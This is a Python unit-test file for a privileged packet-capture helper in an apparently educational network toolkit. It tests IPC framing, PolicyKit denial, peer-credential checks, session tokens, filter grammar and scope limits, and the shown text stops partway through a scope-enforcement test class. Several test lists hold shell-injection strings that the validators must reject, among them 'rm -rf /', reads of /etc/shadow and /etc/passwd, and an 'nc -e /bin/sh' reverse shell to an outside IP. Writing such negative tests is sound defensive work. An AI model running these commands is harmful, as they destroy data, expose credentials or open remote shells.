"""Unit and security regression tests for privileged IPC, PolicyKit boundaries, and packet capture helper."""

import json
import os
import secrets
import select
import socket
import struct
import tempfile
import threading
import time
import unittest
from typing import Any, Dict, List, Optional, Tuple
from unittest.mock import MagicMock, patch

from itsa_network_os.app import Application
from itsa_network_os.core.config import AppConfig
from itsa_network_os.network.scope import ScopeEnclosure, ScopeGuard, ScopeViolationError
from itsa_network_os.security.lab import EducationalPacketLab, PacketField, PacketLayer, ParsedPacket
from itsa_network_os.security.privilege.authorizer import (
    AuthorizationResult,
    MockAuthorizer,
    PolkitAuthorizer,
)
from itsa_network_os.security.privilege.client import PrivilegedCaptureClient
from itsa_network_os.security.privilege.dissector import PacketDissector
from itsa_network_os.security.privilege.filter import FilterSyntaxError, PacketFilter
from itsa_network_os.security.privilege.protocol import (
    MAX_REQUEST_SIZE,
    OP_CAPTURE_PACKETS,
    OP_GET_CAPABILITIES,
    OP_GET_CAPTURE_RESULTS,
    OP_PING,
    OP_START_CAPTURE,
    OP_STOP_CAPTURE,
    POLKIT_ACTION_CAPTURE,
    CaptureRequest,
    CaptureResponse,
    CaptureStatus,
    ErrorCode,
    MessageTooLargeError,
    ProtocolError,
    decode_frame_from_bytes,
    encode_frame,
    read_frame_from_socket,
    validate_request_dict,
)
from itsa_network_os.security.privilege.server import (
    CaptureSession,
    PeerCredentialError,
    PrivilegedCaptureServer,
    SessionRegistry,
    SessionStatus,
    SO_PEERCRED,
    get_socket_peer_credentials,
)
from itsa_network_os.security.validator import SecurityValidationError


class TestPrivilegeProtocolAndValidation(unittest.TestCase):
    """Test protocol schema, length validation, and injection rejection."""

    def test_encode_and_decode_frame(self) -> None:
        """Frame encoding prepends 4-byte big-endian length prefix and decodes accurately."""
        data = {"request_id": 42, "action": OP_PING}
        encoded = encode_frame(data)

        self.assertGreater(len(encoded), 4)
        prefix_len = struct.unpack("!I", encoded[:4])[0]
        self.assertEqual(prefix_len, len(encoded) - 4)

        decoded, consumed = decode_frame_from_bytes(encoded)
        self.assertEqual(decoded["request_id"], 42)
        self.assertEqual(decoded["action"], OP_PING)
        self.assertEqual(consumed, len(encoded))

    def test_oversized_message_raises_message_too_large(self) -> None:
        """Payload exceeding maximum allowable size raises MessageTooLargeError."""
        huge_data = {"request_id": 1, "action": OP_PING, "blob": "X" * (MAX_REQUEST_SIZE + 10)}
        with self.assertRaises(MessageTooLargeError):
            encode_frame(huge_data, max_size=MAX_REQUEST_SIZE)

    def test_validate_request_dict_rejects_unknown_action(self) -> None:
        """Unknown action strings are rejected with ProtocolError."""
        bad_req = {"request_id": 1, "action": "OP_ARBITRARY_COMMAND"}
        with self.assertRaises(ProtocolError) as ctx:
            validate_request_dict(bad_req)
        self.assertIn("Invalid or unsupported action", str(ctx.exception))

    def test_validate_request_dict_rejects_invalid_interface(self) -> None:
        """Command injection attempts in interface names are rejected."""
        malicious_interfaces = [
            "eth0; rm -rf /",
            "eth0 && id",
            "wlan0`whoami`",
            "eth0$(id)",
            "eth0|cat /etc/shadow",
            "very_long_interface_name_exceeding_16_chars",
            "",
        ]
        for iface in malicious_interfaces:
            bad_req = {
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": iface,
                "scope_cidrs": ["192.168.1.0/24"],
            }
            with self.assertRaises(ProtocolError):
                validate_request_dict(bad_req)

    def test_validate_request_dict_rejects_command_injection_in_filter(self) -> None:
        """Shell metacharacters in BPF filter expression are rejected."""
        malicious_filters = [
            "tcp; id",
            "udp && nc -e /bin/sh 1.2.3.4 4444",
            "icmp | whoami",
            "tcp `touch /tmp/pwned`",
            "port 80 > /tmp/out",
            "tcp < /etc/passwd",
            "port 443 $PATH",
            "port 53\nrm -rf /",
        ]
        for filt in malicious_filters:
            bad_req = {
                "request_id": 2,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "filter_expression": filt,
                "scope_cidrs": ["192.168.1.0/24"],
            }
            with self.assertRaises(ProtocolError):
                validate_request_dict(bad_req)

    def test_validate_request_dict_enforces_packet_and_timeout_bounds(self) -> None:
        """Out-of-range packet counts and timeouts are rejected."""
        # Packet count out of bounds
        with self.assertRaises(ProtocolError):
            validate_request_dict({
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "packet_count": 0,
                "scope_cidrs": ["192.168.1.0/24"],
            })
        with self.assertRaises(ProtocolError):
            validate_request_dict({
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "packet_count": 51,
                "scope_cidrs": ["192.168.1.0/24"],
            })

        # Timeout out of bounds
        with self.assertRaises(ProtocolError):
            validate_request_dict({
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "timeout_seconds": 0.05,
                "scope_cidrs": ["192.168.1.0/24"],
            })
        with self.assertRaises(ProtocolError):
            validate_request_dict({
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "timeout_seconds": 15.0,
                "scope_cidrs": ["192.168.1.0/24"],
            })


class TestPrivilegedServerAndClientIPC(unittest.TestCase):
    """Integration tests for Unix domain socket IPC, PolicyKit authorizer, and packet capture server."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.socket_path = os.path.join(self.tmp_dir.name, "helper.sock")
        self.authorizer = MockAuthorizer(default_result=AuthorizationResult.AUTHORIZED)
        self.server = PrivilegedCaptureServer(
            socket_path=self.socket_path,
            authorizer=self.authorizer,
            use_synthetic_capture=True,
        )
        self.server.start_socket()

        # Run accept loop in worker thread
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        self.client = PrivilegedCaptureClient(socket_path=self.socket_path)

    def tearDown(self) -> None:
        self.server.stop()
        if self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
        self.tmp_dir.cleanup()

    def _run_server(self) -> None:
        while self.server._is_running and self.server._server_sock:
            try:
                client_sock, _ = self.server._server_sock.accept()
                self.server.handle_connection_threaded(client_sock)
            except (TimeoutError, socket.timeout, OSError):
                continue

    def test_case_1_unprivileged_application_startup(self) -> None:
        """Application starts cleanly as unprivileged user without root escalation."""
        app = Application(config=AppConfig(database_file=":memory:"))
        self.assertIsNotNone(app)
        self.assertFalse(app.is_running_as_root)

    def test_case_2_authorized_requests(self) -> None:
        """Authorized client receives successful responses for ping, capabilities, and capture."""
        self.assertTrue(self.client.ping())

        caps = self.client.get_capabilities()
        self.assertIn("CAP_NET_RAW", caps["capabilities"])
        self.assertIn(OP_CAPTURE_PACKETS, caps["operations"])

        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.SUCCESS)
        self.assertGreater(len(resp.payload.get("packets", [])), 0)

    def test_case_3_authorization_denial_and_unavailable_service(self) -> None:
        """PolicyKit authorization denial returns DENIED status and UNAUTHORIZED error code."""
        self.authorizer.default_result = AuthorizationResult.DENIED
        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.DENIED)
        self.assertEqual(resp.error_code, ErrorCode.UNAUTHORIZED)

        # Unavailable PolicyKit service fails closed
        self.authorizer.default_result = AuthorizationResult.UNAVAILABLE
        resp2 = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp2.status, CaptureStatus.DENIED)

    def test_case_4_malformed_ipc_requests(self) -> None:
        """Malformed frames or non-dict payloads return INVALID_REQUEST without server crash."""
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(self.socket_path)

        # Send invalid non-JSON payload
        malformed_bytes = b"\x00\x00\x00\x05HELLO"
        sock.sendall(malformed_bytes)
        resp_data = read_frame_from_socket(sock)
        sock.close()

        self.assertEqual(resp_data.get("status"), CaptureStatus.INVALID_REQUEST.value)
        self.assertEqual(resp_data.get("error_code"), ErrorCode.INVALID_SCHEMA.value)

    def test_case_5_invalid_interfaces_and_out_of_scope_targets(self) -> None:
        """Invalid interface or out-of-scope targets fail closed."""
        # Invalid interface name
        resp_iface = self.client.capture_packets(
            interface="invalid/iface!",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp_iface.status, CaptureStatus.INVALID_REQUEST)

        # Out of scope CIDR target (e.g. prefix 0 supernet)
        resp_scope = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["0.0.0.0/0"],  # Overly broad prefixlen 0 prohibited
        )
        self.assertEqual(resp_scope.status, CaptureStatus.SCOPE_VIOLATION)

    def test_case_7_oversized_message_rejected(self) -> None:
        """Message exceeding MAX_REQUEST_SIZE is rejected cleanly."""
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(self.socket_path)

        # Header claiming 70 KB payload
        oversized_header = struct.pack("!I", 70000)
        sock.sendall(oversized_header)
        resp_data = read_frame_from_socket(sock)
        sock.close()

        self.assertEqual(resp_data.get("status"), CaptureStatus.INVALID_REQUEST.value)

    def test_case_8_cancellation_behavior(self) -> None:
        """Cancellation stops active capture immediately and returns CANCELLED status."""
        resp = self.client.start_capture(
            interface="eth0",
            packet_count=50,
            timeout_seconds=5.0,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.SUCCESS)
        sid = resp.payload["session_id"]
        stok = resp.payload["session_token"]

        stop_resp = self.client.stop_capture(session_id=sid, session_token=stok)
        self.assertEqual(stop_resp.status, CaptureStatus.SUCCESS)
        self.assertTrue(stop_resp.payload.get("cancelled"))

        results = self.client.get_capture_results(session_id=sid, session_token=stok)
        self.assertIn(results.status, (CaptureStatus.SUCCESS, CaptureStatus.CANCELLED))
        self.assertEqual(results.payload.get("status"), "CANCELLED")

    def test_case_10_peer_authentication_rejects_unauthorized_uid(self) -> None:
        """Helper rejects client when UID is not in allowed UIDs list."""
        self.authorizer.allowed_uids = {99999}
        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.DENIED)
        self.assertEqual(resp.error_code, ErrorCode.UNAUTHORIZED)

    def test_case_11_repeated_requests_and_concurrency(self) -> None:
        """Multiple sequential and interleaved requests execute reliably without socket exhaustion."""
        for i in range(5):
            self.assertTrue(self.client.ping())
            resp = self.client.capture_packets(
                interface="eth0",
                packet_count=2,
                scope_cidrs=["192.168.1.0/24"],
            )
            self.assertEqual(resp.status, CaptureStatus.SUCCESS)

    def test_case_12_helper_failure_handled_gracefully(self) -> None:
        """Client handles killed or non-existent helper socket cleanly without hang."""
        bad_client = PrivilegedCaptureClient(socket_path=os.path.join(self.tmp_dir.name, "nonexistent.sock"))
        self.assertFalse(bad_client.is_helper_available())
        resp = bad_client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.ERROR)
        self.assertIn("does not exist", resp.error_message)

    def test_case_13_no_fallback_to_root_execution(self) -> None:
        """Application live capture failure raises PermissionError and never invokes sudo or root fallback."""
        app = Application(config=AppConfig(database_file=":memory:"))
        app.scope_guard = ScopeGuard(
            ScopeEnclosure.from_strings(cidrs=["192.168.1.0/24"], interfaces=["eth0"])
        )
        self.authorizer.default_result = AuthorizationResult.DENIED

        with self.assertRaises(PermissionError) as ctx:
            app.get_packet_lab_trace(force_live=True, helper_client=self.client)
        self.assertIn("PolicyKit authorization denied", str(ctx.exception))

    def test_case_9_child_process_termination_and_reaping(self) -> None:
        """Helper subprocess terminates cleanly upon SIGTERM and is reaped without orphans."""
        import subprocess
        import sys

        helper_sock_path = os.path.join(self.tmp_dir.name, "proc_helper.sock")
        proc = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "itsa_network_os.security.privilege.helper_main",
                "--socket",
                helper_sock_path,
                "--synthetic",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        try:
            deadline = time.monotonic() + 2.0
            while not os.path.exists(helper_sock_path) and time.monotonic() < deadline:
                time.sleep(0.05)

            self.assertTrue(os.path.exists(helper_sock_path), "Helper process failed to create socket")

            proc.terminate()
            exit_code = proc.wait(timeout=2.0)
            self.assertEqual(exit_code, 0)
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait(timeout=1.0)

    def test_case_14_no_regression_in_task014_task015(self) -> None:
        """Wireless scanning and worker lifecycle continue to function without regressions."""
        app = Application(config=AppConfig(database_file=":memory:"))
        aps = app.get_wifi_access_points(force_live=False)
        self.assertGreater(len(aps), 0)
        reports = app.analyze_wifi_spectrum(force_live=False)
        self.assertGreater(len(reports), 0)

    def test_case_15_optional_pyside6_compatibility(self) -> None:
        """GUI components and packet lab view operate smoothly without mandatory root."""
        try:
            from PySide6.QtWidgets import QApplication
            from itsa_network_os.ui.desktop.app_window import MainWindow

            os.environ["QT_QPA_PLATFORM"] = "offscreen"
            qt_app = QApplication.instance() or QApplication(["test", "-platform", "offscreen"])
            app = Application(config=AppConfig(database_file=":memory:"))
            window = MainWindow(app=app)
            self.assertIsNotNone(window)
            self.assertIsNotNone(window.lab_provenance_badge)
            self.assertIn("SYNTHETIC", window.lab_provenance_badge.text())
            window.close()
        except ImportError:
            pass


class TestF01CaptureSessionOwnershipAndCancellation(unittest.TestCase):
    """F-01: Secure per-session ownership, capability tokens, and isolated cancellation."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.socket_path = os.path.join(self.tmp_dir.name, "helper_f01.sock")
        self.authorizer = MockAuthorizer(default_result=AuthorizationResult.AUTHORIZED)
        self.server = PrivilegedCaptureServer(
            socket_path=self.socket_path,
            authorizer=self.authorizer,
            use_synthetic_capture=True,
        )
        self.server.start_socket()

        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        self.client = PrivilegedCaptureClient(socket_path=self.socket_path)

    def tearDown(self) -> None:
        self.server.stop()
        if self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
        self.tmp_dir.cleanup()

    def _run_server(self) -> None:
        while self.server._is_running and self.server._server_sock:
            try:
                client_sock, _ = self.server._server_sock.accept()
                self.server.handle_connection_threaded(client_sock)
            except (TimeoutError, socket.timeout, OSError):
                continue

    def test_01_two_clients_can_create_separate_sessions(self) -> None:
        """Two sessions have unique, unpredictable identifiers and capability tokens."""
        resp1 = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])
        resp2 = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])

        self.assertEqual(resp1.status, CaptureStatus.SUCCESS)
        self.assertEqual(resp2.status, CaptureStatus.SUCCESS)

        sid1 = resp1.payload["session_id"]
        tok1 = resp1.payload["session_token"]
        sid2 = resp2.payload["session_id"]
        tok2 = resp2.payload["session_token"]

        self.assertNotEqual(sid1, sid2)
        self.assertNotEqual(tok1, tok2)
        self.assertIsNotNone(self.server.session_registry.get(sid1))
        self.assertIsNotNone(self.server.session_registry.get(sid2))

    def test_02_client_a_cannot_cancel_client_b_session(self) -> None:
        """Client A with wrong capability token cannot cancel Client B's session."""
        resp_b = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])
        sid_b = resp_b.payload["session_id"]

        # Client A tries to cancel session B with a forged token
        forged_token = secrets.token_urlsafe(32)
        stop_resp = self.client.stop_capture(session_id=sid_b, session_token=forged_token)

        self.assertEqual(stop_resp.status, CaptureStatus.DENIED)
        self.assertEqual(stop_resp.error_code, ErrorCode.INVALID_TOKEN)

        sess_b = self.server.session_registry.get(sid_b)
        self.assertIsNotNone(sess_b)
        self.assertFalse(sess_b.cancellation_event.is_set())

    def test_03_same_uid_different_process_requires_capability_token(self) -> None:
        """Process sharing same UID cannot cancel another session without valid capability token."""
        resp = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])
        sid = resp.payload["session_id"]

        # Call with incorrect token under same UID
        wrong_token = "invalid_token_for_same_uid_process"
        stop_resp = self.client.stop_capture(session_id=sid, session_token=wrong_token)

        self.assertEqual(stop_resp.status, CaptureStatus.DENIED)
        self.assertEqual(stop_resp.error_code, ErrorCode.INVALID_TOKEN)

    def test_04_authorized_owner_cancels_own_session(self) -> None:
        """Authorized owner with matching capability token cancels active capture."""
        resp = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])
        sid = resp.payload["session_id"]
        tok = resp.payload["session_token"]

        stop_resp = self.client.stop_capture(session_id=sid, session_token=tok)
        self.assertEqual(stop_resp.status, CaptureStatus.SUCCESS)
        self.assertTrue(stop_resp.payload.get("cancelled"))

        sess = self.server.session_registry.get(sid)
        self.assertEqual(sess.status, SessionStatus.CANCELLED)

    def test_05_unknown_and_completed_session_ids_rejected_safely(self) -> None:
        """Non-existent and completed session IDs are handled safely without server error."""
        # Non-existent session
        stop_resp = self.client.stop_capture(
            session_id="unknown_session_id_404",
            session_token=secrets.token_urlsafe(32),
        )
        self.assertEqual(stop_resp.status, CaptureStatus.INVALID_REQUEST)
        self.assertEqual(stop_resp.error_code, ErrorCode.SESSION_NOT_FOUND)

        # Completed session stop is idempotent
        resp = self.client.start_capture(interface="eth0", packet_count=1, scope_cidrs=["192.168.1.0/24"])
        sid = resp.payload["session_id"]
        tok = resp.payload["session_token"]
        sess = self.server.session_registry.get(sid)
        sess.completion_event.wait(timeout=2.0)

        repeat_stop = self.client.stop_capture(session_id=sid, session_token=tok)
        self.assertEqual(repeat_stop.status, CaptureStatus.SUCCESS)

    def test_06_repeated_and_concurrent_cancellation_is_safe_and_deterministic(self) -> None:
        """Simultaneous cancellation requests succeed deterministically without race condition."""
        resp = self.client.start_capture(interface="eth0", packet_count=50, scope_cidrs=["192.168.1.0/24"])
        sid = resp.payload["session_id"]
        tok = resp.payload["session_token"]

        results = []

        def _cancel_worker() -> None:
            c = PrivilegedCaptureClient(socket_path=self.socket_path)
            r = c.stop_capture(session_id=sid, session_token=tok)
            results.append(r.status)

        threads = [threading.Thread(target=_cancel_worker) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(results), 5)
        for s in results:
            self.assertEqual(s, CaptureStatus.SUCCESS)

    def test_07_cancelling_one_session_does_not_cancel_another(self) -> None:
        """Cancelling session A has no effect on running session B."""
        resp_a = self.client.start_capture(interface="eth0", packet_count=50, scope_cidrs=["192.168.1.0/24"])
        resp_b = self.client.start_capture(interface="eth0", packet_count=2, scope_cidrs=["192.168.1.0/24"])

        sid_a = resp_a.payload["session_id"]
        tok_a = resp_a.payload["session_token"]
        sid_b = resp_b.payload["session_id"]
        tok_b = resp_b.payload["session_token"]

        # Cancel A
        stop_a = self.client.stop_capture(session_id=sid_a, session_token=tok_a)
        self.assertEqual(stop_a.status, CaptureStatus.SUCCESS)

        # Verify B completes successfully
        sess_b = self.server.session_registry.get(sid_b)
        self.assertFalse(sess_b.cancellation_event.is_set())
        sess_b.completion_event.wait(timeout=2.0)
        self.assertEqual(sess_b.status, SessionStatus.COMPLETED)

    def test_08_resources_released_on_completion_timeout_and_shutdown(self) -> None:
        """Server stop shuts down all sessions and joins threads cleanly."""
        resp = self.client.start_capture(interface="eth0", packet_count=50, scope_cidrs=["192.168.1.0/24"])
        sid = resp.payload["session_id"]
        sess = self.server.session_registry.get(sid)

        self.server.session_registry.shutdown_all()
        self.assertTrue(sess.cancellation_event.is_set())
        self.assertEqual(len(self.server.session_registry._sessions), 0)

    def test_09_failed_authorization_does_not_create_session(self) -> None:
        """Denied Polkit authorization creates no session in registry."""
        self.authorizer.default_result = AuthorizationResult.DENIED
        resp = self.client.start_capture(interface="eth0", scope_cidrs=["192.168.1.0/24"])

        self.assertEqual(resp.status, CaptureStatus.DENIED)
        self.assertEqual(len(self.server.session_registry._sessions), 0)

    def test_10_missing_or_invalid_session_identifiers_fail_closed(self) -> None:
        """Malformed or missing session identifiers fail closed at schema validation."""
        req_missing = {"request_id": 1, "action": OP_STOP_CAPTURE, "session_token": "valid_token"}
        with self.assertRaises(ProtocolError):
            validate_request_dict(req_missing)

        req_bad_chars = {
            "request_id": 1,
            "action": OP_STOP_CAPTURE,
            "session_id": "sid; rm -rf /",
            "session_token": "valid_token",
        }
        with self.assertRaises(ProtocolError):
            validate_request_dict(req_bad_chars)


class TestF02PeerCredentialExtraction(unittest.TestCase):
    """F-02: Fail-closed peer credential extraction and rejection of helper EUID fallback."""

    def test_01_successful_so_peercred_extraction(self) -> None:
        """Valid Unix domain socketpair extracts actual peer PID, UID, and GID."""
        sock1, sock2 = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            pid, uid, gid = get_socket_peer_credentials(sock1)
            self.assertGreater(pid, 0)
            self.assertGreaterEqual(uid, 0)
            self.assertGreaterEqual(gid, 0)
        finally:
            sock1.close()
            sock2.close()

    def test_02_getsockopt_raising_oserror_fails_closed(self) -> None:
        """getsockopt raising OSError raises PeerCredentialError."""
        mock_sock = MagicMock()
        mock_sock.getsockopt.side_effect = OSError("Operation not supported")

        with self.assertRaises(PeerCredentialError) as ctx:
            get_socket_peer_credentials(mock_sock)
        self.assertIn("Failed to retrieve socket peer credentials", str(ctx.exception))

    def test_03_missing_so_peercred_support_fails_closed(self) -> None:
        """Socket without SO_PEERCRED support fails closed with PeerCredentialError."""
        mock_sock = MagicMock()
        mock_sock.getsockopt.side_effect = AttributeError("SO_PEERCRED not supported")

        with self.assertRaises(PeerCredentialError):
            get_socket_peer_credentials(mock_sock)

    def test_04_malformed_credential_data_and_struct_error(self) -> None:
        """Truncated or malformed credential byte buffers raise PeerCredentialError."""
        mock_sock = MagicMock()
        mock_sock.getsockopt.return_value = b"\x01\x02\x03"  # Less than 12 bytes

        with self.assertRaises(PeerCredentialError) as ctx:
            get_socket_peer_credentials(mock_sock)
        self.assertIn("invalid byte length", str(ctx.exception))

    def test_05_invalid_pid_uid_gid_values(self) -> None:
        """Negative PID, UID, or GID values fail closed."""
        mock_sock = MagicMock()
        # PID = -1
        mock_sock.getsockopt.return_value = struct.pack("3i", -1, 1000, 1000)
        with self.assertRaises(PeerCredentialError) as ctx:
            get_socket_peer_credentials(mock_sock)
        self.assertIn("Invalid peer PID", str(ctx.exception))

        # UID = -1
        mock_sock.getsockopt.return_value = struct.pack("3i", 1234, -1, 1000)
        with self.assertRaises(PeerCredentialError) as ctx:
            get_socket_peer_credentials(mock_sock)
        self.assertIn("Invalid peer UID", str(ctx.exception))

    def test_06_proof_helper_euid_never_substituted(self) -> None:
        """Helper EUID is never substituted upon credential failure."""
        mock_sock = MagicMock()
        mock_sock.getsockopt.side_effect = OSError("Socket error")

        with patch("os.geteuid", return_value=0):  # Simulate helper running as root
            with self.assertRaises(PeerCredentialError):
                get_socket_peer_credentials(mock_sock)

    def test_07_failed_credential_extraction_prevents_authorization_and_dispatch(self) -> None:
        """Failed credential extraction causes immediate DENIED response without authorizer or dispatch."""
        def _failing_extractor(sock: socket.socket) -> Tuple[int, int, int]:
            raise PeerCredentialError("Mock credential extraction failure")

        tmp_dir = tempfile.TemporaryDirectory()
        sock_path = os.path.join(tmp_dir.name, "cred_fail.sock")
        mock_auth = MagicMock()

        server = PrivilegedCaptureServer(
            socket_path=sock_path,
            authorizer=mock_auth,
            credential_extractor=_failing_extractor,
        )
        server.start_socket()

        try:
            client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            client_sock.connect(sock_path)

            server_side, _ = server._server_sock.accept()
            server.handle_client_connection(server_side)

            resp_data = read_frame_from_socket(client_sock)
            client_sock.close()

            self.assertEqual(resp_data.get("status"), CaptureStatus.DENIED.value)
            self.assertEqual(resp_data.get("error_code"), ErrorCode.UNAUTHORIZED.value)
            self.assertIn("Peer credential verification failed", resp_data.get("error_message", ""))
            mock_auth.check_authorization.assert_not_called()
        finally:
            server.stop()
            tmp_dir.cleanup()


class TestF03PacketFilterEnforcement(unittest.TestCase):
    """F-03: Packet filtering grammar compilation and enforcement."""

    def test_01_tcp_matches_tcp_excludes_non_tcp(self) -> None:
        """Filter 'tcp' matches TCP packets and excludes UDP and ICMP."""
        f = PacketFilter.compile("tcp")
        trace = EducationalPacketLab.get_sample_trace()
        # trace[0] is DNS/UDP, trace[1] is TCP, trace[2] is TCP, trace[3] is ICMP
        self.assertFalse(f.matches(trace[0]))
        self.assertTrue(f.matches(trace[1]))
        self.assertTrue(f.matches(trace[2]))
        self.assertFalse(f.matches(trace[3]))

    def test_02_udp_matches_udp_excludes_non_udp(self) -> None:
        """Filter 'udp' matches UDP packets and excludes TCP and ICMP."""
        f = PacketFilter.compile("udp")
        trace = EducationalPacketLab.get_sample_trace()
        self.assertTrue(f.matches(trace[0]))
        self.assertFalse(f.matches(trace[1]))
        self.assertFalse(f.matches(trace[2]))
        self.assertFalse(f.matches(trace[3]))

    def test_03_arp_matches_arp(self) -> None:
        """Filter 'arp' matches ARP packets and excludes IP packets."""
        f = PacketFilter.compile("arp")
        trace = EducationalPacketLab.get_sample_trace()
        for pkt in trace:
            self.assertFalse(f.matches(pkt))

        arp_pkt = ParsedPacket(index=1, protocol="ARP", src="192.168.1.1", dst="192.168.1.2", summary="ARP", length_bytes=42, layers=[])
        self.assertTrue(f.matches(arp_pkt))

    def test_04_supported_port_expressions(self) -> None:
        """Supported port expressions evaluate correctly against packet layers and endpoints."""
        trace = EducationalPacketLab.get_sample_trace()

        f_port53 = PacketFilter.compile("port 53")
        self.assertTrue(f_port53.matches(trace[0]))  # 1.1.1.1:53
        self.assertFalse(f_port53.matches(trace[1])) # 443

        f_src_port = PacketFilter.compile("src port 51234")
        self.assertTrue(f_src_port.matches(trace[0])) # src is 51234
        self.assertFalse(f_src_port.matches(trace[1]))

        f_dst_443 = PacketFilter.compile("tcp and dst port 443")
        self.assertTrue(f_dst_443.matches(trace[1])) # TCP dst 443
        self.assertFalse(f_dst_443.matches(trace[0])) # UDP

    def test_05_non_matching_packets_excluded_from_results(self) -> None:
        """Packets not matching the filter are excluded from captured result set."""
        tmp_dir = tempfile.TemporaryDirectory()
        sock_path = os.path.join(tmp_dir.name, "filter_helper.sock")
        server = PrivilegedCaptureServer(
            socket_path=sock_path,
            authorizer=MockAuthorizer(AuthorizationResult.AUTHORIZED),
            use_synthetic_capture=True,
        )
        server.start_socket()
        server_thread = threading.Thread(
            target=lambda: server.handle_connection_threaded(server._server_sock.accept()[0]),
            daemon=True,
        )
        server_thread.start()

        client = PrivilegedCaptureClient(socket_path=sock_path)
        try:
            # Request packets matching "tcp and port 80" (synthetic trace has only 443, 53)
            resp = client.capture_packets(
                interface="eth0",
                packet_count=10,
                timeout_seconds=0.2,
                filter_expression="tcp and port 80",
                scope_cidrs=["192.168.1.0/24"],
            )
            self.assertEqual(resp.status, CaptureStatus.SUCCESS)
            self.assertEqual(len(resp.payload.get("packets", [])), 0)
        finally:
            server.stop()
            tmp_dir.cleanup()

    def test_06_malformed_and_unsupported_expressions_fail_closed(self) -> None:
        """Unsupported and contradictory filter grammar fails closed."""
        bad_expressions = [
            "icmp and port 80",
            "arp and dst port 1",
            "tcp or udp",
            "not tcp",
            "port 0",
            "port 70000",
            "host 192.168.1.1",
            "net 10.0.0.0/8",
            "invalid_proto",
        ]
        for expr in bad_expressions:
            with self.assertRaises(FilterSyntaxError):
                PacketFilter.compile(expr)

    def test_07_empty_filter_policy(self) -> None:
        """Empty or None filter explicitly matches all valid in-scope packets."""
        f_none = PacketFilter.compile(None)
        f_empty = PacketFilter.compile("")
        f_spaces = PacketFilter.compile("   ")

        trace = EducationalPacketLab.get_sample_trace()
        for pkt in trace:
            self.assertTrue(f_none.matches(pkt))
            self.assertTrue(f_empty.matches(pkt))
            self.assertTrue(f_spaces.matches(pkt))

    def test_08_fragmented_malformed_packets_cannot_crash_or_bypass(self) -> None:
        """Runt or malformed packet does not crash filter engine and fails closed on port predicates."""
        runt = ParsedPacket(index=1, protocol="Runt Frame", src="", dst="", summary="Runt", length_bytes=5, layers=[])
        f_tcp = PacketFilter.compile("tcp")
        f_port = PacketFilter.compile("port 80")

        self.assertFalse(f_tcp.matches(runt))
        self.assertFalse(f_port.matches(runt))

    def test_09_filtering_never_invokes_shell_or_exec(self) -> None:
        """Shell injection in filters is blocked by syntax validation."""
        injections = ["tcp; rm -rf /", "udp | cat /etc/passwd", "tcp `id`", "port 80 $(reboot)"]
        for inj in injections:
            with self.assertRaises(FilterSyntaxError):
                PacketFilter.compile(inj)

    def test_10_filtering_preserves_capture_limits_and_timeouts(self) -> None:
        """Filtering adheres to requested packet count limits."""
        f_tcp = PacketFilter.compile("tcp")
        trace = EducationalPacketLab.get_sample_trace()
        matched = [pkt for pkt in trace if f_tcp.matches(pkt)]
        self.assertEqual(len(matched), 2)


class TestF04MandatoryScopeEnforcement(unittest.TestCase):
    """F-04: Mandatory network scope enclosure enforcement."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.socket_path = os.path.join(self.tmp_dir.name, "scope_helper.sock")
        self.server = PrivilegedCaptureServer(
            socket_path=self.socket_path,
            authorizer=MockAuthorizer(AuthorizationResult.AUTHORIZED),
            use_synthetic_capture=True,
        )
        self.server.start_socket()

        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        self.client = PrivilegedCaptureClient(socket_path=self.socket_path)

    def tearDown(self) -> None:
        self.server.stop()
        if self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
        self.tmp_dir.cleanup()

    def _run_server(self) -> None:
        while self.server._is_running and self.server._server_sock:
            try:
                client_sock, _ = self.server._server_sock.accept()
                self.server.handle_connection_threaded(client_sock)
